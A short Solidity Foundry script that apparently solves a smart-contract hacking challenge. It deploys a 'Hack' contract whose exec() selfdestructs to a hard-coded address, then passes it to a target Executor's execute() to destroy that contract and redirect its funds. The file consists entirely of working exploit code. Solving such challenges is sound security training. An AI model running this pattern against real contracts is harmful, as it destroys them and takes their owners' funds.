// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

import "../src/Task.sol";
import {Script, console} from "forge-std/Script.sol";

contract Hack {
    function exec() external {
        selfdestruct(payable(0xe05762b1e030fA0b022DC6321162Ad322bf9bE64));
    }
}

contract Solution is Script {
    function run() external {
        Executor executorInstance = Executor(
            0xe4A6F2dEcd848164F7d8500964680Ff1359FE30E
        );
        // Proxy proxyInstance = Proxy(0x299300e4A8Aca354b1c44A8cF11Bf23c8D8C9722);
        vm.startBroadcast();
        Hack hackInstance = new Hack();
        executorInstance.execute(address(hackInstance));
        vm.stopBroadcast();
    }
}
